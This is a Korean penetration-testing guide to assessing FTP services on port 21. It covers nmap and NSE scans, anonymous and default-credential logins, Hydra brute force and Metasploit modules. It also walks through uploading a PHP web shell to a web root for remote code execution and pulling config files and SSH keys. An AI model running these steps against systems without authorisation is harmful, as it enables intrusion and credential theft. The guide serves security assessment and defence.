---
sidebar_position: 1
title: FTP (Port 21)
---

# FTP 취약점 진단 (포트 21)

## 개요

**FTP (File Transfer Protocol)**: 파일 전송을 위한 프로토콜

**일반적인 FTP 서비스**:
- vsftpd
- ProFTPD
- Pure-FTPd
- Microsoft IIS FTP

---

## 취약점 진단 체크리스트

### 1. 서비스 버전 확인
구버전 FTP 서비스는 알려진 취약점이 존재할 가능성 높음

### 2. 익명 로그인 가능 여부
`anonymous` 계정으로 로그인 가능한지 확인

### 3. 파일 권한 확인
- 읽기 권한: 중요 정보 유출 가능
- 쓰기 권한: 악성 파일 업로드 가능

### 4. 기본 계정 확인
FTP 서비스의 기본 계정명과 비밀번호 확인

---

## 정보 수집

### 서비스 버전 확인

```bash
# Nmap 서비스 스캔
nmap -p 21 -sV -sC <target>

# 예시
nmap -p 21 -sV -sC 192.168.1.10

# 출력 예시:
# 21/tcp open  ftp     vsftpd 2.3.4
# | ftp-anon: Anonymous FTP login allowed
```

### NSE 스크립트 활용

```bash
# FTP 익명 로그인 확인
nmap -p 21 --script ftp-anon <target>

# FTP 브루트포스
nmap -p 21 --script ftp-brute <target>

# 모든 FTP 스크립트 실행
nmap -p 21 --script "ftp-*" <target>
```

---

## 취약점 진단

### 익명 로그인 테스트

```bash
# FTP 접속
ftp <target>

# 또는 포트 지정
ftp <target> 21

# 로그인 시도
Name: anonymous
Password: (아무거나 또는 Enter)
```

**성공 시**:
```
230 Login successful.
ftp>
```

### 파일 및 디렉토리 권한 확인

```bash
# FTP 세션에서
ftp> ls -la

# 출력 예시:
# drwxr-xr-x    2 0        0            4096 Oct 10 12:00 uploads
# -rw-r--r--    1 0        0             220 Oct 10 12:00 README.txt

# 현재 경로 확인
ftp> pwd

# 디렉토리 이동
ftp> cd uploads

# 쓰기 권한 테스트
ftp> put test.txt
```

### 다운로드/업로드 테스트

```bash
# 파일 다운로드
ftp> get <filename>

# 예시
ftp> get config.txt

# 파일 업로드
ftp> put <filename>

# 예시
ftp> put shell.php
```

---

## 공개 취약점 검색

### Searchsploit 사용

```bash
# Exploit-DB 검색
searchsploit <service> <version>

# 예시
searchsploit vsftpd 2.3.4

# 출력:
# vsftpd 2.3.4 - Backdoor Command Execution
# Path: /usr/share/exploitdb/exploits/unix/remote/17491.rb

# 익스플로잇 코드 확인
searchsploit -x 17491
```

### 온라인 검색

Google 검색 예시:
```
"vsftpd 2.3.4" vulnerability
"ProFTPD 1.3.5" exploit
```

---

## 기본 계정 확인

### 일반적인 기본 계정

```
anonymous:(빈 비밀번호)
ftp:ftp
admin:admin
admin:password
root:root
```

### 기본 계정 검색

Google 검색:
```
"<FTP 서비스> <버전>" default credentials
"vsftpd" default username password
```

온라인 리소스:
- https://cirt.net/passwords
- https://www.fortypoundhead.com/tools_dpw.asp

---

## FTP 진단 핵심 질문

### 1. 어떤 파일을 다운받을 수 있는가?
```bash
ftp> ls -la
ftp> cd /var/www/html
ftp> get index.php
```

중요 파일:
- 설정 파일 (config.php, wp-config.php)
- 백업 파일 (.bak, .backup)
- SSH 키 (id_rsa)

### 2. 어떤 파일을 업로드할 수 있는가?
```bash
ftp> cd uploads
ftp> put shell.php
```

### 3. 업로드/다운로드 경로는 어디인가?
```bash
ftp> pwd
# /var/www/html/uploads

ftp> cd ../
ftp> pwd
# /var/www/html
```

**경로 파악이 중요한 이유**:
- 웹 서버 루트와 FTP 경로가 같으면 웹 쉘 업로드 가능
- 다른 서비스와의 연계 공격 가능

### 4. 업로드한 파일을 다른 서비스로 실행할 수 있는가?

**시나리오**:
1. FTP로 PHP 웹 쉘 업로드
2. 웹 브라우저로 해당 파일 접속
3. 웹 쉘 실행 → RCE

```bash
# 1. PHP 쉘 업로드
ftp> put shell.php

# 2. 웹으로 접속
http://<target>/uploads/shell.php?cmd=id
```

---

## 고급 기법

### FTP Bounce Attack

```bash
# Nmap을 통한 간접 스캔
nmap -b <ftp-server> <target>

# 예시
nmap -b ftp.example.com 192.168.1.100
```

### Passive vs Active Mode

```bash
# Passive 모드 (방화벽 우회에 유용)
ftp> passive

# Active 모드
ftp> active
```

---

## 자동화 도구

### Hydra (브루트포스)

```bash
# 단일 유저
hydra -l admin -P passwords.txt ftp://<target>

# 다수 유저
hydra -L users.txt -P passwords.txt ftp://<target>

# 예시
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.10
```

### Metasploit

```bash
msfconsole

# FTP 익명 로그인 스캔
use auxiliary/scanner/ftp/anonymous

# FTP 버전 스캔
use auxiliary/scanner/ftp/ftp_version

# FTP 브루트포스
use auxiliary/scanner/ftp/ftp_login
```

---

## 주요 명령어 요약

```bash
# 서비스 스캔
nmap -p 21 -sV -sC <target>

# FTP 접속
ftp <target>

# FTP 명령어
ls -la              # 파일 목록
cd <directory>      # 디렉토리 이동
pwd                 # 현재 경로
get <file>          # 다운로드
put <file>          # 업로드
passive             # Passive 모드

# 취약점 검색
searchsploit <service> <version>

# 브루트포스
hydra -l <user> -P <wordlist> ftp://<target>
```

## 보안 권장사항

1. ✅ 익명 로그인 비활성화
2. ✅ 강력한 비밀번호 정책
3. ✅ 최신 버전으로 업데이트
4. ✅ FTPS (FTP over SSL/TLS) 사용
5. ✅ 불필요한 쓰기 권한 제거
